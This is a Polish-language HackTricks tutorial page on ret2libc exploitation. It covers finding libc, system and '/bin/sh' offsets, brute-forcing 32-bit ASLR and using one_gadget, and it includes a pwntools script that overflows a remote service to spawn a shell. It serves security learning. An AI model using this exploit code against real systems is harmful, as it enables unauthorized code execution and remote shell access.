# Ret2lib

<details>

<summary><strong>Naucz się hakować AWS od zera do bohatera z</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Inne sposoby wsparcia HackTricks:

* Jeśli chcesz zobaczyć swoją **firmę reklamowaną w HackTricks** lub **pobrać HackTricks w formacie PDF**, sprawdź [**PLANY SUBSKRYPCYJNE**](https://github.com/sponsors/carlospolop)!
* Zdobądź [**oficjalne gadżety PEASS & HackTricks**](https://peass.creator-spring.com)
* Odkryj [**Rodzinę PEASS**](https://opensea.io/collection/the-peass-family), naszą kolekcję ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
* **Dołącz do** 💬 [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **śledź** nas na **Twitterze** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Podziel się swoimi sztuczkami hakerskimi, przesyłając PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>

## **Podstawowe informacje**

Idea **Ret2Libc** polega na przekierowaniu przepływu wykonania podatnego programu do funkcji w bibliotece współdzielonej (np. **system**, **execve**, **strcpy**) zamiast wykonywania kodu shell dostarczonego przez atakującego na stosie. Atakujący tworzy ładunek, który modyfikuje adres powrotu na stosie wskazujący na pożądaną funkcję biblioteczną, jednocześnie zapewniając, że wszelkie konieczne argumenty są poprawnie ustawione zgodnie z konwencją wywołania.

### **Przykładowe kroki (uproszczone)**

* Uzyskaj adres funkcji do wywołania (np. system) i polecenie do wykonania (np. /bin/sh)
* Wygeneruj łańcuch ROP, aby przekazać pierwszy argument wskazujący na łańcuch polecenia i przepływ wykonania do funkcji

## Znajdowanie adresów

* Zakładając, że używana jest biblioteka `libc` z bieżącej maszyny, można znaleźć, gdzie zostanie załadowana w pamięci za pomocą:

{% code overflow="wrap" %}
```bash
ldd /path/to/executable | grep libc.so.6 #Address (if ASLR, then this change every time)
```
{% endcode %}

Jeśli chcesz sprawdzić, czy ASLR zmienia adres libc, możesz to zrobić:
```bash
for i in `seq 0 20`; do ldd ./<bin> | grep libc; done
```
* Znając używaną bibliotekę libc, można również znaleźć przesunięcie do funkcji `system` za pomocą:
```bash
readelf -s /lib/i386-linux-gnu/libc.so.6 | grep system
```
* Znając używaną bibliotekę libc, można również znaleźć przesunięcie do funkcji łańcucha `/bin/sh` za pomocą:
```bash
strings -a -t x /lib/i386-linux-gnu/libc.so.6 | grep /bin/sh
```
### Korzystanie z gdb-peda / GEF

Znając używaną bibliotekę libc, można również użyć Peda lub GEF, aby uzyskać adres funkcji **system**, funkcji **exit** oraz ciągu znaków **`/bin/sh`**:
```
p system
p exit
find "/bin/sh"
```
### Korzystanie z /proc/\<PID>/maps

Jeśli proces tworzy **dzieci** za każdym razem, gdy z nim rozmawiasz (serwer sieciowy), spróbuj **odczytać** ten plik (prawdopodobnie będziesz musiał być rootem).

Tutaj możesz znaleźć **dokładne miejsce, gdzie jest załadowany libc** wewnątrz procesu i **gdzie będzie załadowany** dla każdego dziecka procesu.

![](<../../../../.gitbook/assets/image (95).png>)

W tym przypadku jest załadowany pod adresem **0xb75dc000** (Będzie to adres bazowy libc)

## Nieznany libc

Może być możliwe, że **nie znasz libc, które jest ładowane przez binarny plik** (ponieważ może znajdować się na serwerze, do którego nie masz dostępu). W takim przypadku możesz wykorzystać podatność do **wycieku niektórych adresów i znalezienia, który libc** jest używany:

{% content-ref url="rop-leaking-libc-address/" %}
[rop-leaking-libc-address](rop-leaking-libc-address/)
{% endcontent-ref %}

A szablon pwntools do tego znajdziesz tutaj:

{% content-ref url="rop-leaking-libc-address/rop-leaking-libc-template.md" %}
[rop-leaking-libc-template.md](rop-leaking-libc-address/rop-leaking-libc-template.md)
{% endcontent-ref %}

## Omijanie ASLR w 32 bitach

Te ataki brute-force są **przydatne tylko dla systemów 32-bitowych**.

* Jeśli exploit jest lokalny, możesz spróbować bruteforce'ować adres bazowy libc (przydatne dla systemów 32-bitowych):
```python
for off in range(0xb7000000, 0xb8000000, 0x1000):
```
* Jeśli atakujesz zdalny serwer, możesz spróbować **przeprowadzić atak siłowy na adres funkcji `usleep` z biblioteki `libc`**, przekazując jako argument 10 (na przykład). Jeśli w pewnym momencie **serwer potrzebuje dodatkowych 10 sekund na odpowiedź**, oznacza to, że znalazłeś adres tej funkcji.

## ONE\_GADGET

[**ONE\_GADGET**](https://github.com/david942j/one\_gadget) pozwala uzyskać dostęp do powłoki zamiast korzystać z funkcji **system** i **"/bin/sh". ONE\_GADGET** znajdzie w bibliotece libc sposób na uzyskanie dostępu do powłoki, używając tylko jednego adresu **ROP**.\
Jednak zazwyczaj istnieją pewne ograniczenia, najczęstsze i łatwe do uniknięcia to takie jak `[rsp+0x30] == NULL`. Kontrolując wartości w **RSP**, wystarczy wysłać więcej wartości NULL, aby uniknąć tego ograniczenia.

![](<../../../../.gitbook/assets/image (615).png>)
```python
ONE_GADGET = libc.address + 0x4526a
rop2 = base + p64(ONE_GADGET) + "\x00"*100
```
## Przykład kodu x86 Ret2lib

W tym przykładzie ASLR brute-force jest zintegrowany w kodzie, a podatny plik binarny znajduje się na zdalnym serwerze:
```python
from pwn import *

c = remote('192.168.85.181',20002)
c.recvline()

for off in range(0xb7000000, 0xb8000000, 0x1000):
p = ""
p += p32(off + 0x0003cb20) #system
p += "CCCC" #GARBAGE, could be address of exit()
p += p32(off + 0x001388da) #/bin/sh
payload = 'A'*0x20010 + p
c.send(payload)
c.interactive()
```
## Przykład kodu x64 Ret2lib

Sprawdź przykład z:

{% content-ref url="../rop-return-oriented-programing.md" %}
[rop-return-oriented-programing.md](../rop-return-oriented-programing.md)
{% endcontent-ref %}

## Ret-do-printf (lub puts)

Pozwala to **wyciekać informacje z procesu** poprzez wywołanie `printf`/`puts` z określonymi danymi umieszczonymi jako argument.

## Ret2printf

Oznacza to w zasadzie nadużycie **Ret2lib w celu przekształcenia go w podatność na łańcuchy formatujące `printf`**, korzystając z `ret2lib` do wywołania printf z wartościami do wykorzystania (brzmi bezużytecznie, ale jest to możliwe):

{% content-ref url="../../format-strings/" %}
[format-strings](../../format-strings/)
{% endcontent-ref %}

<details>

<summary><strong>Dowiedz się, jak hakować AWS od zera do bohatera z</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Inne sposoby wsparcia HackTricks:

* Jeśli chcesz zobaczyć swoją **firmę reklamowaną w HackTricks** lub **pobrać HackTricks w formacie PDF**, sprawdź [**PLANY SUBSKRYPCYJNE**](https://github.com/sponsors/carlospolop)!
* Zdobądź [**oficjalne gadżety PEASS & HackTricks**](https://peass.creator-spring.com)
* Odkryj [**Rodzinę PEASS**](https://opensea.io/collection/the-peass-family), naszą kolekcję ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
* **Dołącz do** 💬 [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **śledź** nas na **Twitterze** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Podziel się swoimi sztuczkami hakerskimi, przesyłając PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
